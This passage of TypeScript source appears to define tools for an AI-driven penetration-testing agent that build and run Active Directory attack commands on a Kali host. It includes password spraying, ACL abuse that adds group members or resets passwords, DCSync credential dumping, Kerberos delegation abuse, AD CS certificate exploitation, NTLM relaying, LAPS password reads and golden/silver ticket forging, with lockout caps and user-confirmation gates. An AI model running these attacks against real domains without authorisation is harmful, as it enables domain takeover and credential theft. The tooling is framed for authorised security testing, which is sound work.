        reason: "LOCKOUT_MARGIN_LEAVES_NO_HEADROOM",
        tool: "password_spray_ad",
        target: identity_target_id,
        lockout_threshold,
        lockout_safety_margin,
        message: `Lockout Mandate (§15.1): threshold ${lockout_threshold} - margin ${lockout_safety_margin} = ${maxSafeAttempts} (< 1 safe attempt). Spray BLOCKED.`,
      });
    }

    // Default to ONE attempt; >1 is explicit opt-in and still capped at the safe ceiling.
    const requestedAttempts = Math.max(1, attempts_per_user);
    const effectiveAttempts = Math.min(requestedAttempts, maxSafeAttempts);

    // Only spray as many distinct passwords as our per-window attempt budget allows.
    const passwordsToSpray = passwords.slice(0, effectiveAttempts);

    // 5. Never touch excluded principals — also enforced here, not only at the validator.
    const excludeList = ["krbtgt", ...exclusions].map((e) => e.toLowerCase());

    const commands: string[] = [
      `echo "=== AD Password Spray (LOCKOUT-AWARE, §15.1) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}"`,
      `echo "Lockout threshold: ${lockout_threshold}  Safety margin: ${lockout_safety_margin}  Safe ceiling: ${maxSafeAttempts}"`,
      `echo "Requested attempts/user: ${requestedAttempts}  Effective (capped): ${effectiveAttempts}"`,
      `echo "Passwords this run: ${passwordsToSpray.length}  Jitter: ${jitter_seconds}s  Abort-on-lockout: ${abort_on_first_lockout}"`,
      `echo "Excluded principals (never sprayed): ${excludeList.join(", ")}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("kerbrute", "version"),
      preflight("nxc", "--version"),
      `echo ""`,
      // Build a sanitized userlist with excluded principals stripped (one user per line).
      `echo "--- Stripping excluded principals from user list ---"`,
      `grep -ivE ${sq(`^(${excludeList.join("|")})$`)} ${sq(userlist)} > /tmp/spray-users-${identity_target_id}.txt 2>&1 || cp ${sq(userlist)} /tmp/spray-users-${identity_target_id}.txt`,
      `echo "Users to spray: $(wc -l < /tmp/spray-users-${identity_target_id}.txt 2>/dev/null || echo '?')"`,
      `echo ""`,
    ];

    // 3. One password per window, sprayed ACROSS users (never down one account).
    // 4. Abort on first observed lockout.
    passwordsToSpray.forEach((pw, idx) => {
      commands.push(`echo "--- Spray window ${idx + 1}/${passwordsToSpray.length} (one password across all users) ---"`);
      // kerbrute passwordspray is lockout-friendly (one pw across users); --safe aborts on lockout.
      const safeFlag = abort_on_first_lockout ? " --safe" : "";
      commands.push(
        `kerbrute passwordspray --dc ${sq(dc_ip)} -d ${sq(domain)}${safeFlag} /tmp/spray-users-${identity_target_id}.txt ${sq(pw)} 2>&1 || echo "kerbrute spray window ${idx + 1} reported failures/lockout (see output above)"`
      );
      // Abort-on-lockout guard: if kerbrute --safe halts, the && chain still continues to
      // the next echo, so we surface a hard notice the operator must heed.
      if (abort_on_first_lockout) {
        commands.push(
          `echo "[abort_on_first_lockout=true] If a lockout was observed above, DO NOT proceed to the next window — halt the spray."`
        );
      }
      // Jitter between windows.
      if (idx < passwordsToSpray.length - 1 && jitter_seconds > 0) {
        commands.push(`echo "Jitter ${jitter_seconds}s before next window..." && sleep ${Math.floor(jitter_seconds)}`);
      }
      commands.push(`echo ""`);
    });

    commands.push(`echo "=== AD Password Spray Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  abuse_ad_acl: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    target_principal: string;
    edge_type: string;
    attempt_write?: boolean;
    exclusions?: string[];
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, target_principal, edge_type, attempt_write = false, exclusions = [] } = args;

    // Never modify an excluded principal — hard gate before any write.
    const excludeList = ["krbtgt", ...exclusions].map((e) => e.toLowerCase());
    if (attempt_write && excludeList.includes(target_principal.toLowerCase())) {
      return JSON.stringify({
        status: "BLOCKED",
        reason: "EXCLUDED_PRINCIPAL",
        tool: "abuse_ad_acl",
        target: identity_target_id,
        target_principal,
        message: `§15.1: '${target_principal}' is an excluded principal — directory writes against it are hard-blocked.`,
      });
    }

    const auth = nt_hash
      ? `-u ${sq(username)} -p ${sq(`:${nt_hash}`)} --host ${sq(dc_ip)} -d ${sq(domain)}`
      : `-u ${sq(username)} -p ${sq(password ?? "")} --host ${sq(dc_ip)} -d ${sq(domain)}`;

    const commands: string[] = [
      `echo "=== AD ACL Abuse (edge: ${edge_type}) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}"`,
      `echo "Edge: ${edge_type} over '${target_principal}'  attempt_write: ${attempt_write}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("bloodyAD", "--help"),
      preflight("dacledit.py"),
      `echo ""`,
    ];

    if (!attempt_write) {
      // READ-ONLY default: show the current ACL / object state, do not modify.
      commands.push(`echo "--- READ-ONLY (attempt_write=false): showing current object security ---"`);
      commands.push(
        `bloodyAD ${auth} get object ${sq(target_principal)} --attr nTSecurityDescriptor 2>&1 || echo "bloodyAD read FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(
        `echo "WRITE GATED: to abuse the ${edge_type} edge against '${target_principal}', set attempt_write=true AND complete the multi-step user-confirm protocol (.claude/agents/_preamble.md §15.2)."`
      );
    } else {
      // WRITE path — requires user-confirm per §15.2 (the agent must have confirmed).
      commands.push(`echo "--- WRITE (attempt_write=true) — user-confirm protocol MUST have run (§15.2) ---"`);
      switch (edge_type) {
        case "AddMember":
          commands.push(
            `bloodyAD ${auth} add groupMember ${sq(target_principal)} ${sq(username)} 2>&1 || echo "AddMember FAILED (see stderr above)"`
          );
          break;
        case "ForceChangePassword":
          commands.push(
            `echo "ForceChangePassword on '${target_principal}' — using a benign reset to prove control:" && bloodyAD ${auth} set password ${sq(target_principal)} ${sq("Maestro-PoC-" + Date.now())} 2>&1 || echo "ForceChangePassword FAILED (see stderr above)"`
          );
          break;
        case "WriteOwner":
          commands.push(
            `bloodyAD ${auth} set owner ${sq(target_principal)} ${sq(username)} 2>&1 || echo "WriteOwner FAILED (see stderr above)"`
          );
          break;
        case "GenericAll":
        case "WriteDACL":
          commands.push(
            `bloodyAD ${auth} add genericAll ${sq(target_principal)} ${sq(username)} 2>&1 || echo "${edge_type} grant FAILED (see stderr above)"`
          );
          break;
        default:
          commands.push(`echo "Unsupported edge_type '${edge_type}' for write"`);
      }
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== AD ACL Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  dcsync: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    target_user?: string;
    attempt_dcsync?: boolean;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, target_user, attempt_dcsync = false } = args;
    const auth = buildImpacketAuth({ domain, username, password, nt_hash });
    const commands: string[] = [
      `echo "=== DCSync (secretsdump -just-dc, read-only replication) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}  attempt_dcsync: ${attempt_dcsync}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("secretsdump.py"),
      `echo ""`,
    ];

    if (!attempt_dcsync) {
      commands.push(
        `echo "GATED: DCSync not executed (attempt_dcsync=false). This is a read-only replication pull but high-impact — set attempt_dcsync=true to prove DA-equivalent access."`
      );
    } else {
      const justUser = target_user ? ` -just-dc-user ${sq(target_user)}` : "";
      commands.push(`echo "--- DCSync replication pull (secretsdump -just-dc) ---"`);
      commands.push(
        `secretsdump.py ${auth} -dc-ip ${sq(dc_ip)} -just-dc${justUser} 2>&1 || echo "secretsdump -just-dc FAILED (see stderr above; not replication rights vs not-installed)"`
      );
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== DCSync Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  abuse_delegation: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    delegation_type: string;
    impersonate_user?: string;
    target_spn?: string;
    target_computer?: string;
    attempt_rbcd_write?: boolean;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, delegation_type, impersonate_user, target_spn, target_computer, attempt_rbcd_write = false } = args;
    const auth = buildImpacketAuth({ domain, username, password, nt_hash });
    const commands: string[] = [
      `echo "=== Kerberos Delegation Abuse (${delegation_type}) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}"`,
      `echo "Impersonate: ${impersonate_user ?? "(none)"}  SPN: ${target_spn ?? "(none)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("getST.py"),
      preflight("findDelegation.py"),
      preflight("rbcd.py"),
      `echo ""`,
    ];

    // Always enumerate the delegation edges first (read-only).
    commands.push(`echo "--- Enumerating delegation (findDelegation, read-only) ---"`);
    commands.push(
      `findDelegation.py ${auth} -dc-ip ${sq(dc_ip)} 2>&1 || echo "findDelegation FAILED (see stderr above)"`
    );
    commands.push(`echo ""`);

    if (delegation_type === "rbcd") {
      if (!attempt_rbcd_write) {
        commands.push(
          `echo "GATED: RBCD requires a directory write (msDS-AllowedToActOnBehalfOfOtherIdentity). attempt_rbcd_write=false — not executed. Set true AND complete the user-confirm protocol (§15.2)."`
        );
      } else if (target_computer) {
        commands.push(`echo "--- RBCD write (rbcd.py) — user-confirm MUST have run (§15.2) ---"`);
        commands.push(
          `rbcd.py ${auth} -dc-ip ${sq(dc_ip)} -delegate-to ${sq(target_computer)} -delegate-from ${sq(username)} -action write 2>&1 || echo "rbcd write FAILED (see stderr above)"`
        );
      } else {
        commands.push(`echo "RBCD write requested but no target_computer supplied"`);
      }
    } else if ((delegation_type === "constrained" || delegation_type === "unconstrained") && impersonate_user && target_spn) {
      // getST impersonation is non-destructive (no persistent directory change).
      commands.push(`echo "--- S4U impersonation (getST -impersonate, non-destructive) ---"`);
      commands.push(
        `getST.py ${auth} -dc-ip ${sq(dc_ip)} -spn ${sq(target_spn)} -impersonate ${sq(impersonate_user)} 2>&1 || echo "getST FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "Provide impersonate_user + target_spn for constrained/unconstrained, or target_computer for rbcd."`);
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== Delegation Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  exploit_adcs: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    ca?: string;
    template?: string;
    esc_type: string;
    target_upn?: string;
    attempt_request?: boolean;
    attempt_esc8_relay?: boolean;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, ca, template, esc_type, target_upn, attempt_request = false, attempt_esc8_relay = false } = args;
    const auth = nt_hash
      ? `-u ${sq(`${username}@${domain}`)} -hashes ${sq(`:${nt_hash}`)}`
      : `-u ${sq(`${username}@${domain}`)} -p ${sq(password ?? "")}`;
    const commands: string[] = [
      `echo "=== AD CS Exploitation (${esc_type}) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}"`,
      `echo "CA: ${ca ?? "(none)"}  Template: ${template ?? "(none)"}  Impersonate UPN: ${target_upn ?? "(none)"}"`,
      `echo "attempt_request: ${attempt_request}  attempt_esc8_relay: ${attempt_esc8_relay}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("certipy"),
      `echo ""`,
    ];

    if (esc_type === "ESC8") {
      if (!attempt_esc8_relay) {
        commands.push(
          `echo "GATED: ESC8 requires an NTLM relay to the CA web endpoint (MITM position). attempt_esc8_relay=false — printing plan only. Set true AND complete the user-confirm/multi-step protocol (§15.2)."`
        );
        commands.push(
          `echo "PLAN: 1) certipy relay -target 'http://<CA>/certsrv/certfnsh.asp' -template <template>  2) coerce auth (PetitPotam/printerbug)  3) receive cert  4) PKINIT -> TGT."`
        );
      } else {
        commands.push(`echo "--- ESC8 relay (certipy relay) — user-confirm MUST have run (§15.2) ---"`);
        commands.push(
          `certipy relay -target ${sq(`http://${dc_ip}`)}${template ? ` -template ${sq(template)}` : ""} 2>&1 || echo "certipy relay FAILED (see stderr above)"`
        );
      }
    } else {
      if (!attempt_request) {
        commands.push(
          `echo "GATED: cert request not executed (attempt_request=false). This is non-destructive (issues a cert to self) — set attempt_request=true to request + auth."`
        );
      } else if (ca && template) {
        commands.push(`echo "--- Requesting cert (certipy req) ---"`);
        const upnFlag = target_upn ? ` -upn ${sq(target_upn)}` : "";
        commands.push(
          `cd /tmp && certipy req ${auth} -dc-ip ${sq(dc_ip)} -ca ${sq(ca)} -template ${sq(template)}${upnFlag} 2>&1 || echo "certipy req FAILED (see stderr above)"`
        );
        commands.push(`echo ""`);
        commands.push(`echo "--- Authenticating with the cert (certipy auth, PKINIT -> TGT) ---"`);
        commands.push(
          `cd /tmp && certipy auth -pfx ${sq((target_upn ? target_upn.split("@")[0] : username) + ".pfx")} -dc-ip ${sq(dc_ip)} 2>&1 || echo "certipy auth FAILED (see stderr above)"`
        );
      } else {
        commands.push(`echo "ESC1-style request needs both ca and template (from enum_adcs_templates)."`);
      }
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== AD CS Exploitation Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  read_laps: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip: string;
    username: string;
    password?: string;
    nt_hash?: string;
    computer?: string;
  }) => {
    const { identity_target_id, domain, dc_ip, username, password, nt_hash, computer } = args;
    const nxcAuth = nt_hash ? `-u ${sq(username)} -H ${sq(nt_hash)}` : `-u ${sq(username)} -p ${sq(password ?? "")}`;
    const commands: string[] = [
      `echo "=== LAPS Password Read (read-only) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  DC: ${dc_ip}  Computer: ${computer ?? "(all readable)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("nxc", "--version"),
      preflight("bloodyAD", "--help"),
      `echo ""`,
      `echo "--- NetExec LAPS read ---"`,
      `nxc ldap ${sq(dc_ip)} -d ${sq(domain)} ${nxcAuth} --laps${computer ? ` --computer ${sq(computer)}` : ""} 2>&1 || echo "nxc --laps FAILED (see stderr above)"`,
      `echo ""`,
      `echo "=== LAPS Password Read Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  ntlm_relay: async (args: {
    identity_target_id: string;
    domain: string;
    relay_target: string;
    relay_mode: string;
    coercion?: string;
    attempt_relay?: boolean;
  }) => {
    const { identity_target_id, domain, relay_target, relay_mode, coercion = "none", attempt_relay = false } = args;
    const commands: string[] = [
      `echo "=== NTLM/SMB Relay (MULTI-STEP, USER-CONFIRM §15.2) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  Relay to: ${relay_target} (${relay_mode})  Coercion: ${coercion}"`,
      `echo "attempt_relay: ${attempt_relay}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("ntlmrelayx.py"),
      preflight("mitm6", "--help"),
      `echo ""`,
    ];

    if (!attempt_relay) {
      commands.push(
        `echo "GATED: ntlmrelayx NOT started (attempt_relay=false). This needs a MITM/coercion position and is the most sensitive AD op — the multi-step user-confirm protocol (§15.2) MUST run first."`
      );
      commands.push(
        `echo "PLAN: 1) position for coercion (${coercion})  2) ntlmrelayx --target ${relay_target} (mode: ${relay_mode})  3) on relayed auth: add computer / grant RBCD / enroll cert. Present feasibility + YES/NO to the user before executing."`
      );
    } else {
      commands.push(`echo "--- Starting ntlmrelayx (user-confirm MUST have run; §15.2) ---"`);
      let relayFlags = `-t ${sq(relay_target)}`;
      if (relay_mode === "ldap") relayFlags += " --delegate-access";
      if (relay_mode === "adcs_http") relayFlags += " --adcs";
      commands.push(
        `timeout 120 ntlmrelayx.py -smb2support ${relayFlags} 2>&1 || echo "ntlmrelayx exited (timeout/no coerced auth/see stderr above)"`
      );
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== NTLM/SMB Relay Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  golden_ticket: async (args: {
    identity_target_id: string;
    domain: string;
    dc_ip?: string;
    ticket_type?: string;
    krbtgt_hash?: string;
    service_hash?: string;
    domain_sid: string;
    impersonate_user?: string;
    target_spn?: string;
    attempt_forge?: boolean;
  }) => {
    const { identity_target_id, domain, dc_ip, ticket_type = "golden", krbtgt_hash, service_hash, domain_sid, impersonate_user = "Administrator", target_spn, attempt_forge = false } = args;
    const ccache = `/tmp/${impersonate_user}-${identity_target_id}.ccache`;
    const commands: string[] = [
      `echo "=== ${ticket_type === "silver" ? "Silver" : "Golden"} Ticket Forge (forge + use, non-destructive) ==="`,
      `echo "Target: ${identity_target_id}  Domain: ${domain}  Impersonate: ${impersonate_user}  attempt_forge: ${attempt_forge}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("ticketer.py"),
      preflight("secretsdump.py"),
      `echo ""`,
    ];

    if (!attempt_forge) {
      commands.push(
        `echo "GATED: ticket not forged (attempt_forge=false). Forge + use is non-destructive (no account/directory change) — set attempt_forge=true to prove persistence/DA-equivalent access."`
      );
    } else if (ticket_type === "golden") {
      if (!krbtgt_hash) {
        commands.push(`echo "ERROR: golden ticket needs krbtgt_hash (from a prior dcsync)."`);
      } else {
        commands.push(`echo "--- Forging Golden TGT (ticketer) ---"`);
        commands.push(
          `cd /tmp && ticketer.py -nthash ${sq(krbtgt_hash)} -domain-sid ${sq(domain_sid)} -domain ${sq(domain)} ${sq(impersonate_user)} 2>&1 || echo "ticketer (golden) FAILED (see stderr above)"`
        );
        commands.push(`echo ""`);
        commands.push(`echo "--- Using the forged ticket to prove access (secretsdump -k) ---"`);
        commands.push(
          `cd /tmp && KRB5CCNAME=${sq(ccache)} secretsdump.py -k -no-pass ${sq(`${domain}/${impersonate_user}@${dc_ip ?? domain}`)} -just-dc-user krbtgt 2>&1 || echo "forged-ticket secretsdump FAILED/blocked (see stderr above)"`
        );
      }
    } else {
      // silver
      if (!service_hash || !target_spn) {
        commands.push(`echo "ERROR: silver ticket needs service_hash and target_spn."`);
      } else {
        commands.push(`echo "--- Forging Silver TGS (ticketer) ---"`);
        commands.push(
          `cd /tmp && ticketer.py -nthash ${sq(service_hash)} -domain-sid ${sq(domain_sid)} -domain ${sq(domain)} -spn ${sq(target_spn)} ${sq(impersonate_user)} 2>&1 || echo "ticketer (silver) FAILED (see stderr above)"`
        );
      }
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== Ticket Forge Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },
};
